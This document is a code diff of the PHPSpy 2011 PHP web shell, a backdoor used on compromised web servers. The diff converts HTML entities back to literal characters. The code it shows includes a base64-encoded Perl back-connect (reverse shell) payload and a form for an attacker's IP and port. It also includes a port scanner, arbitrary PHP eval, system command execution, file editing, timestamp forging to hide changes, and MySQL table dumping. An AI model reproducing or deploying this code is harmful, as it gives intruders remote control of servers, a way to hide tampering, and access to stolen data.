 	$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
 		"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
@@ -1303,62 +1303,62 @@ elseif ($action == 'backconnect') {
 		m("Now script try connect to $yourip port $yourport ...");
 	}
 
-	formhead(array('title'=&gt;'Back Connect'));
+	formhead(array('title'=>'Back Connect'));
 	makehide('action','backconnect');
-	p('&lt;p&gt;');
+	p('<p>');
 	p('Your IP:');
-	makeinput(array('name'=&gt;'yourip','size'=&gt;20,'value'=&gt;$yourip));
+	makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));
 	p('Your Port:');
-	makeinput(array('name'=&gt;'yourport','size'=&gt;15,'value'=&gt;$yourport));
+	makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));
 	p('Use:');
-	makeselect(array('name'=&gt;'use','option'=&gt;$usedb,'selected'=&gt;$use));
-	makeinput(array('name'=&gt;'start','value'=&gt;'Start','type'=&gt;'submit','class'=&gt;'bt'));
-	p('&lt;/p&gt;');
+	makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));
+	makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));
+	p('</p>');
 	formfoot();
 }//end
 
 elseif ($action == 'portscan') {
 	!$scanip && $scanip = '127.0.0.1';
 	!$scanport && $scanport = '21,25,80,110,135,139,445,1433,3306,3389,5631,43958';
-	formhead(array('title'=&gt;'Port Scan'));
+	formhead(array('title'=>'Port Scan'));
 	makehide('action','portscan');
-	p('&lt;p&gt;');
+	p('<p>');
 	p('IP:');
-	makeinput(array('name'=&gt;'scanip','size'=&gt;20,'value'=&gt;$scanip));
+	makeinput(array('name'=>'scanip','size'=>20,'value'=>$scanip));
 	p('Port:');
-	makeinput(array('name'=&gt;'scanport','size'=&gt;80,'value'=&gt;$scanport));
-	makeinput(array('name'=&gt;'startscan','value'=&gt;'Scan','type'=&gt;'submit','class'=&gt;'bt'));
-	p('&lt;/p&gt;');
+	makeinput(array('name'=>'scanport','size'=>80,'value'=>$scanport));
+	makeinput(array('name'=>'startscan','value'=>'Scan','type'=>'submit','class'=>'bt'));
+	p('</p>');
 	formfoot();
 
 	if ($startscan) {
-		p('&lt;h2&gt;Result &raquo;&lt;/h2&gt;');
-		p('&lt;ul class="info"&gt;');
+		p('<h2>Result &raquo;</h2>');
+		p('<ul class="info">');
 		foreach(explode(',', $scanport) as $port) {
 			$fp = @fsockopen($scanip, $port, &$errno, &$errstr, 1); 
 			if (!$fp) {
-				p('&lt;li&gt;'.$scanip.':'.$port.' ------------------------ &lt;span style="font-weight:bold;color:#f00;"&gt;Close&lt;/span&gt;&lt;/li&gt;');
+				p('<li>'.$scanip.':'.$port.' ------------------------ <span style="font-weight:bold;color:#f00;">Close</span></li>');
 		   } else {
-				p('&lt;li&gt;'.$scanip.':'.$port.' ------------------------ &lt;span style="font-weight:bold;color:#080;"&gt;Open&lt;/span&gt;&lt;/li&gt;');
+				p('<li>'.$scanip.':'.$port.' ------------------------ <span style="font-weight:bold;color:#080;">Open</span></li>');
 				@fclose($fp);
 		   } 
 		}
-		p('&lt;/ul&gt;');
+		p('</ul>');
 	}
 }
 
 elseif ($action == 'eval') {
 	$phpcode = trim($phpcode);
 	if($phpcode){
-		if (!preg_match('#&lt;\?#si', $phpcode)) {
+		if (!preg_match('#<\?#si', $phpcode)) {
 			$phpcode = "<?php\n\n{$phpcode}\n\n?>";
 		}
-		eval("?"."&gt;$phpcode<?");
+		eval("?".">$phpcode<?");
 	}
-	formhead(array('title'=&gt;'Eval PHP Code'));
+	formhead(array('title'=>'Eval PHP Code'));
 	makehide('action','eval');
-	maketext(array('title'=&gt;'PHP Code','name'=&gt;'phpcode', 'value'=&gt;$phpcode));
-	p('&lt;p&gt;&lt;a href="http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/" target="_blank"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;');
+	maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
+	p('<p><a href="http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/" target="_blank">Get plugins</a></p>');
 	formfooter();
 }//end eval
 
@@ -1369,11 +1369,11 @@ elseif ($action == 'editfile') {
 		@fclose($fp);
 		$contents=htmlspecialchars($contents);
 	}
-	formhead(array('title'=&gt;'Create / Edit File'));
+	formhead(array('title'=>'Create / Edit File'));
 	makehide('action','file');
 	makehide('dir',$nowpath);
-	makeinput(array('title'=&gt;'Current File (import new file name and new file)','name'=&gt;'editfilename','value'=&gt;$opfile,'newline'=&gt;1));
-	maketext(array('title'=&gt;'File Content','name'=&gt;'filecontent','value'=&gt;$contents));
+	makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
+	maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
 	formfooter();
 	
 	goback();
@@ -1383,30 +1383,30 @@ elseif ($action == 'editfile') {
 elseif ($action == 'newtime') {
 	$opfilemtime = @filemtime($opfile);
 	//$time = strtotime("$year-$month-$day $hour:$minute:$second");
-	$cachemonth = array('January'=&gt;1,'February'=&gt;2,'March'=&gt;3,'April'=&gt;4,'May'=&gt;5,'June'=&gt;6,'July'=&gt;7,'August'=&gt;8,'September'=&gt;9,'October'=&gt;10,'November'=&gt;11,'December'=&gt;12);
-	formhead(array('title'=&gt;'Clone folder/file was last modified time'));
+	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
+	formhead(array('title'=>'Clone folder/file was last modified time'));
 	makehide('action','file');
 	makehide('dir',$nowpath);
-	makeinput(array('title'=&gt;'Alter folder/file','name'=&gt;'curfile','value'=&gt;$opfile,'size'=&gt;120,'newline'=&gt;1));
-	makeinput(array('title'=&gt;'Reference folder/file (fullpath)','name'=&gt;'tarfile','size'=&gt;120,'newline'=&gt;1));
+	makeinput(array('title'=>'Alter folder/file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
+	makeinput(array('title'=>'Reference folder/file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
 	formfooter();
-	formhead(array('title'=&gt;'Set last modified'));
+	formhead(array('title'=>'Set last modified'));
 	makehide('action','file');
 	makehide('dir',$nowpath);
-	makeinput(array('title'=&gt;'Current folder/file (fullpath)','name'=&gt;'curfile','value'=&gt;$opfile,'size'=&gt;120,'newline'=&gt;1));
-	p('&lt;p&gt;year:');
-	makeinput(array('name'=&gt;'year','value'=&gt;date('Y',$opfilemtime),'size'=&gt;4));
+	makeinput(array('title'=>'Current folder/file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
+	p('<p>year:');
+	makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
 	p('month:');
-	makeinput(array('name'=&gt;'month','value'=&gt;date('m',$opfilemtime),'size'=&gt;2));
+	makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
 	p('day:');
-	makeinput(array('name'=&gt;'day','value'=&gt;date('d',$opfilemtime),'size'=&gt;2));
+	makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
 	p('hour:');
-	makeinput(array('name'=&gt;'hour','value'=&gt;date('H',$opfilemtime),'size'=&gt;2));
+	makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
 	p('minute:');
-	makeinput(array('name'=&gt;'minute','value'=&gt;date('i',$opfilemtime),'size'=&gt;2));
+	makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
 	p('second:');
-	makeinput(array('name'=&gt;'second','value'=&gt;date('s',$opfilemtime),'size'=&gt;2));
-	p('&lt;/p&gt;');
+	makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
+	p('</p>');
 	formfooter();
 	goback();
 }//end newtime
@@ -1415,45 +1415,45 @@ elseif ($action == 'shell') {
 	if (IS_WIN && IS_COM) {
 		if($program && $parameter) {
 			$shell= new COM('Shell.Application');
-			$a = $shell-&gt;ShellExecute($program,$parameter);
+			$a = $shell->ShellExecute($program,$parameter);
 			m('Program run has '.(!$a ? 'success' : 'fail'));
 		}
 		!$program && $program = 'c:\windows\system32\cmd.exe';
-		!$parameter && $parameter = '/c net start &gt; '.SA_ROOT.'log.txt';
-		formhead(array('title'=&gt;'Execute Program'));
+		!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';
+		formhead(array('title'=>'Execute Program'));
 		makehide('action','shell');
-		makeinput(array('title'=&gt;'Program','name'=&gt;'program','value'=&gt;$program,'newline'=&gt;1));
-		p('&lt;p&gt;');
-		makeinput(array('title'=&gt;'Parameter','name'=&gt;'parameter','value'=&gt;$parameter));
-		makeinput(array('name'=&gt;'submit','class'=&gt;'bt','type'=&gt;'submit','value'=&gt;'Execute'));
-		p('&lt;/p&gt;');
+		makeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));
+		p('<p>');
+		makeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));
+		makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
+		p('</p>');
 		formfoot();
 	}
-	formhead(array('title'=&gt;'Execute Command'));
+	formhead(array('title'=>'Execute Command'));
 	makehide('action','shell');
 	if (IS_WIN && IS_COM) {
-		$execfuncdb = array('phpfunc'=&gt;'phpfunc','wscript'=&gt;'wscript','proc_open'=&gt;'proc_open');
-		makeselect(array('title'=&gt;'Use:','name'=&gt;'execfunc','option'=&gt;$execfuncdb,'selected'=&gt;$execfunc,'newline'=&gt;1));
+		$execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');
+		makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
 	}
-	p('&lt;p&gt;');
-	makeinput(array('title'=&gt;'Command','name'=&gt;'command','value'=&gt;htmlspecialchars($command)));
-	makeinput(array('name'=&gt;'submit','class'=&gt;'bt','type'=&gt;'submit','value'=&gt;'Execute'));
-	p('&lt;/p&gt;');
+	p('<p>');
+	makeinput(array('title'=>'Command','name'=>'command','value'=>htmlspecialchars($command)));
+	makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
+	p('</p>');
 	formfoot();
 
 	if ($command) {
-		p('&lt;hr width="100%" noshade /&gt;&lt;pre&gt;');
+		p('<hr width="100%" noshade /><pre>');
 		if ($execfunc=='wscript' && IS_WIN && IS_COM) {
 			$wsh = new COM('WScript.shell');
-			$exec = $wsh-&gt;exec('cmd.exe /c '.$command);
-			$stdout = $exec-&gt;StdOut();
-			$stroutput = $stdout-&gt;ReadAll();
+			$exec = $wsh->exec('cmd.exe /c '.$command);
+			$stdout = $exec->StdOut();
+			$stroutput = $stdout->ReadAll();
 			echo $stroutput;
 		} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
 			$descriptorspec = array(
-			   0 =&gt; array('pipe', 'r'),
-			   1 =&gt; array('pipe', 'w'),
-			   2 =&gt; array('pipe', 'w')
+			   0 => array('pipe', 'r'),
+			   1 => array('pipe', 'w'),
+			   2 => array('pipe', 'w')
 			);
 			$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
 			if (is_resource($process)) {
@@ -1473,7 +1473,7 @@ elseif ($action == 'shell') {
 		} else {
 			echo(execute($command));
 		}
-		p('&lt;/pre&gt;');
+		p('</pre>');
 	}
 }//end shell
 
@@ -1482,55 +1482,55 @@ elseif ($action == 'phpenv') {
 	$adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
 	!$dis_func && $dis_func = 'No';	
 	$info = array(
-		1 =&gt; array('Server Time',date('Y/m/d h:i:s',$timestamp)),
-		2 =&gt; array('Server Domain',$_SERVER['SERVER_NAME']),
-		3 =&gt; array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
-		4 =&gt; array('Server OS',PHP_OS),
-		5 =&gt; array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
-		6 =&gt; array('Server Software',$_SERVER['SERVER_SOFTWARE']),
-		7 =&gt; array('Server Web Port',$_SERVER['SERVER_PORT']),
-		8 =&gt; array('PHP run mode',strtoupper(php_sapi_name())),
-		9 =&gt; array('The file path',__FILE__),
+		1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
+		2 => array('Server Domain',$_SERVER['SERVER_NAME']),
+		3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
+		4 => array('Server OS',PHP_OS),
+		5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
+		6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),
+		7 => array('Server Web Port',$_SERVER['SERVER_PORT']),
+		8 => array('PHP run mode',strtoupper(php_sapi_name())),
+		9 => array('The file path',__FILE__),
 
-		10 =&gt; array('PHP Version',PHP_VERSION),
-		11 =&gt; array('PHPINFO',(IS_PHPINFO ? '&lt;a href="javascript:g(\'phpinfo\');"&gt;Yes&lt;/a&gt;' : 'No')),
-		12 =&gt; array('Safe Mode',getcfg('safe_mode')),
-		13 =&gt; array('Administrator',$adminmail),
-		14 =&gt; array('allow_url_fopen',getcfg('allow_url_fopen')),
-		15 =&gt; array('enable_dl',getcfg('enable_dl')),
-		16 =&gt; array('display_errors',getcfg('display_errors')),
-		17 =&gt; array('register_globals',getcfg('register_globals')),
-		18 =&gt; array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
-		19 =&gt; array('memory_limit',getcfg('memory_limit')),
-		20 =&gt; array('post_max_size',getcfg('post_max_size')),
-		21 =&gt; array('upload_max_filesize',$upsize),
-		22 =&gt; array('max_execution_time',getcfg('max_execution_time').' second(s)'),
-		23 =&gt; array('disable_functions',$dis_func),
+		10 => array('PHP Version',PHP_VERSION),
+		11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:g(\'phpinfo\');">Yes</a>' : 'No')),
+		12 => array('Safe Mode',getcfg('safe_mode')),
+		13 => array('Administrator',$adminmail),
+		14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
+		15 => array('enable_dl',getcfg('enable_dl')),
+		16 => array('display_errors',getcfg('display_errors')),
+		17 => array('register_globals',getcfg('register_globals')),
+		18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
+		19 => array('memory_limit',getcfg('memory_limit')),
+		20 => array('post_max_size',getcfg('post_max_size')),
+		21 => array('upload_max_filesize',$upsize),
+		22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
+		23 => array('disable_functions',$dis_func),
 	);
 
 	if($phpvarname) {
 		m($phpvarname .' : '.getcfg($phpvarname));
 	}
 
-	formhead(array('title'=&gt;'Server environment'));
+	formhead(array('title'=>'Server environment'));
 	makehide('action','phpenv');
-	makeinput(array('title'=&gt;'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=&gt;'phpvarname','value'=&gt;$phpvarname,'newline'=&gt;1));
+	makeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
 	formfooter();
 
-	$hp = array(0=&gt; 'Server', 1=&gt; 'PHP');
-	for($a=0;$a&lt;2;$a++) {
-		p('&lt;h2&gt;'.$hp[$a].' &raquo;&lt;/h2&gt;');
-		p('&lt;ul class="info"&gt;');
+	$hp = array(0=> 'Server', 1=> 'PHP');
+	for($a=0;$a<2;$a++) {
+		p('<h2>'.$hp[$a].' &raquo;</h2>');
+		p('<ul class="info">');
 		if ($a==0) {
-			for($i=1;$i&lt;=9;$i++) {
-				p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');
+			for($i=1;$i<=9;$i++) {
+				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
 			}
 		} elseif ($a == 1) {
-			for($i=10;$i&lt;=23;$i++) {
-				p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');
+			for($i=10;$i<=23;$i++) {
+				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
 			}
 		}
-		p('&lt;/ul&gt;');
+		p('</ul>');
 	}
 }//end phpenv
 
@@ -1592,13 +1592,13 @@ else {
 }
 
 ?>
-&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"&gt;
-	&lt;span style="float:right;"&gt;<?php debuginfo();ob_end_flush();?>&lt;/span&gt;
-	Powered by &lt;a title="Build 20110502" href="http://www.4ngel.net" target="_blank"&gt;<?php echo str_replace('.','','P.h.p.S.p.y');?> 2011&lt;/a&gt;. Copyright (C) 2004-2011 &lt;a href="http://www.4ngel.net" target="_blank"&gt;Security Angel Team [S4T]&lt;/a&gt; All Rights Reserved.
-&lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+</td></tr></table>
+<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
+	<span style="float:right;"><?php debuginfo();ob_end_flush();?></span>
+	Powered by <a title="Build 20110502" href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2011</a>. Copyright (C) 2004-2011 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
+</div>
+</body>
+</html>
 
 <?php
 
@@ -1609,19 +1609,19 @@ else {
 function secparam($n, $v) {
 	$v = trim($v);
 	if($v) {
-		p('&lt;h2&gt;'.$n.' &raquo;&lt;/h2&gt;');
-		p('&lt;div class="infolist"&gt;');
+		p('<h2>'.$n.' &raquo;</h2>');
+		p('<div class="infolist">');
 		if(strpos($v, "\n") === false)
-			p($v.'&lt;br /&gt;');
+			p($v.'<br />');
 		else
-			p('&lt;pre&gt;'.$v.'&lt;/pre&gt;');
-		p('&lt;/div&gt;');
+			p('<pre>'.$v.'</pre>');
+		p('</div>');
 	}
 }
 function m($msg) {
-	echo '&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;';
+	echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
 	echo $msg;
-	echo '&lt;/div&gt;';
+	echo '</div>';
 }
 function scookie($key, $value, $life = 0, $prefix = 1) {
 	global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
@@ -1632,50 +1632,50 @@ function scookie($key, $value, $life = 0, $prefix = 1) {
 }	
 function multi($num, $perpage, $curpage, $tablename) {
 	$multipage = '';
-	if($num &gt; $perpage) {
+	if($num > $perpage) {
 		$page = 10;
 		$offset = 5;
 		$pages = @ceil($num / $perpage);
-		if($page &gt; $pages) {
+		if($page > $pages) {
 			$from = 1;
 			$to = $pages;
 		} else {
 			$from = $curpage - $offset;
 			$to = $curpage + $page - $offset - 1;
-			if($from &lt; 1) {
+			if($from < 1) {
 				$to = $curpage + 1 - $from;
 				$from = 1;
-				if(($to - $from) &lt; $page && ($to - $from) &lt; $pages) {
+				if(($to - $from) < $page && ($to - $from) < $pages) {
 					$to = $page;
 				}
-			} elseif($to &gt; $pages) {
+			} elseif($to > $pages) {
 				$from = $curpage - $pages + $to;
 				$to = $pages;
-				if(($to - $from) &lt; $page && ($to - $from) &lt; $pages) {
+				if(($to - $from) < $page && ($to - $from) < $pages) {
 					$from = $pages - $page + 1;
 				}
 			}
 		}
-		$multipage = ($curpage - $offset &gt; 1 && $pages &gt; $page ? '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', 1);"&gt;First&lt;/a&gt; ' : '').($curpage &gt; 1 ? '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');"&gt;Prev&lt;/a&gt; ' : '');
-		for($i = $from; $i &lt;= $to; $i++) {
-			$multipage .= $i == $curpage ? $i.' ' : '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');"&gt;['.$i.']&lt;/a&gt; ';
+		$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
+		for($i = $from; $i <= $to; $i++) {
+			$multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
 		}
-		$multipage .= ($curpage &lt; $pages ? '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');"&gt;Next&lt;/a&gt;' : '').($to &lt; $pages ? ' &lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');"&gt;Last&lt;/a&gt;' : '');
-		$multipage = $multipage ? '&lt;p&gt;Pages: '.$multipage.'&lt;/p&gt;' : '';
+		$multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
+		$multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
 	}
 	return $multipage;
 }
 // µÇÂ½Èë¿Ú
 function loginpage() {
 ?>
-	&lt;style type="text/css"&gt;
+	<style type="text/css">
 	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
-	&lt;/style&gt;
-	&lt;form method="POST" action=""&gt;
-	&lt;span style="font:11px Verdana;"&gt;Password: &lt;/span&gt;&lt;input name="password" type="password" size="20"&gt;
-	&lt;input type="hidden" name="action" value="login"&gt;
-	&lt;input type="submit" value="Login"&gt;
-	&lt;/form&gt;
+	</style>
+	<form method="POST" action="">
+	<span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
+	<input type="hidden" name="action" value="login">
+	<input type="submit" value="Login">
+	</form>
 <?php
 	exit;
 }//end loginpage()
@@ -1744,16 +1744,16 @@ function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306')
 	global $charsetdb;
 	@ini_set('mysql.connect_timeout', 5);
 	if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
-		p('&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;');
+		p('<h2>Can not connect to MySQL server</h2>');
 		exit;
 	}
 	if($link && $dbname) {
 		if (!@mysql_select_db($dbname, $link)) {
-			p('&lt;h2&gt;Database selected has error&lt;/h2&gt;');
+			p('<h2>Database selected has error</h2>');
 			exit;
 		}
 	}
-	if($link && mysql_get_server_info() &gt; '4.1') {
+	if($link && mysql_get_server_info() > '4.1') {
 		if($charset && in_array(strtolower($charset), $charsetdb)) {
 			q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
 		}
@@ -1764,7 +1764,7 @@ function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306')
 // È¥µô×ªÒå×Ö·û
 function s_array(&$array) {
 	if (is_array($array)) {
-		foreach ($array as $k =&gt; $v) {
+		foreach ($array as $k => $v) {
 			$array[$k] = s_array($v);
 		}
 	} else if (is_string($array)) {
@@ -1776,7 +1776,7 @@ function s_array(&$array) {
 // Çå³ýHTML´úÂë
 function html_clean($content) {
 	$content = htmlspecialchars($content);
-	$content = str_replace("\n", "&lt;br /&gt;", $content);
+	$content = str_replace("\n", "<br />", $content);
 	$content = str_replace("  ", "&nbsp;&nbsp;", $content);
 	$content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
 	return $content;
@@ -1819,7 +1819,7 @@ function getUser($filepath)	{
 	if (function_exists('posix_getpwuid')) {
 		$array = @posix_getpwuid(@fileowner($filepath));
 		if ($array && is_array($array)) {
-			return ' / &lt;a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'"&gt;'.$array['name'].'&lt;/a&gt;';
+			return ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
 		}
 	}
 	return '';
@@ -1828,7 +1828,7 @@ function getUser($filepath)	{
 // É¾³ýÄ¿Â¼
 function deltree($deldir) {
 	$mydir=@dir($deldir);	
-	while($file=$mydir-&gt;read())	{ 		
+	while($file=$mydir->read())	{ 		
 		if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) { 
 			@chmod($deldir.'/'.$file,0777);
 			deltree($deldir.'/'.$file); 
@@ -1838,7 +1838,7 @@ function deltree($deldir) {
 			@unlink($deldir.'/'.$file);
 		}
 	} 
-	$mydir-&gt;close(); 
+	$mydir->close(); 
 	@chmod($deldir,0777);
 	return @rmdir($deldir) ? 1 : 0;
 }
@@ -1866,7 +1866,7 @@ function getPath($scriptpath, $nowpath) {
 function getUpPath($nowpath) {
 	$pathdb = explode('/', $nowpath);
 	$num = count($pathdb);
-	if ($num &gt; 2) {
+	if ($num > 2) {
 		unset($pathdb[$num-1],$pathdb[$num-2]);
 	}
 	$uppath = implode('/', $pathdb).'/';
@@ -1998,7 +1998,7 @@ function GetSFileList($dir, $content, $re = 0) {
 
 function qy($sql) { 
 	global $mysqllink;
-	//echo $sql.'&lt;br&gt;';
+	//echo $sql.'<br>';
 	$res = $error = '';
 	if(!$res = @mysql_query($sql,$mysqllink)) { 
 		return 0;
@@ -2044,7 +2044,7 @@ function sqldumptable($table, $fp=0) {
 	$tabledump = '';
 	$rows = q("SELECT * FROM $table");
 	while ($row = mysql_fetch_assoc($rows)) {
-		foreach($row as $k=&gt;$v) {
+		foreach($row as $k=>$v) {
 			$row[$k] = "'".@mysql_real_escape_string($v)."'";
 		}
 		$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(", ", $row).');'."\n";
@@ -2063,26 +2063,26 @@ function p($str){
 }
 
 function tbhead() {
-	p('&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;');
+	p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
 }
 function tbfoot(){
-	p('&lt;/table&gt;');
+	p('</table>');
 }
 
 function makehide($name,$value=''){
-	p("&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;");
+	p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
 }
 
 function makeinput($arg = array()){
-	$arg['size'] = $arg['size'] &gt; 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
+	$arg['size'] = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
 	$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
 	!$arg['type'] && $arg['type'] = 'text';
-	$arg['title'] = $arg['title'] ? $arg['title'].'&lt;br /&gt;' : '';
+	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
 	$arg['class'] = $arg['class'] ? $arg['class'] : 'input';
 	if ($arg['newline']) {
-		p("&lt;p&gt;$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;&lt;/p&gt;");
+		p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
 	} else {
-		p("$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;");
+		p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
 	}
 }
 
@@ -2091,29 +2091,29 @@ function makeselect($arg = array()){
 		$onchange = 'onchange="'.$arg['onchange'].'"';
 	}
 	$arg['title'] = $arg['title'] ? $arg['title'] : '';
-	if ($arg['newline']) p('&lt;p&gt;');
-	p("$arg[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange&gt;");
+	if ($arg['newline']) p('<p>');
+	p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
 		if (is_array($arg['option'])) {
 			if ($arg['nokey']) {
 				foreach ($arg['option'] as $value) {
 					if ($arg['selected']==$value) {
-						p("&lt;option value=\"$value\" selected&gt;$value&lt;/option&gt;");
+						p("<option value=\"$value\" selected>$value</option>");
 					} else {
-						p("&lt;option value=\"$value\"&gt;$value&lt;/option&gt;");
+						p("<option value=\"$value\">$value</option>");
 					}
 				}
 			} else {
-				foreach ($arg['option'] as $key=&gt;$value) {
+				foreach ($arg['option'] as $key=>$value) {
 					if ($arg['selected']==$key) {
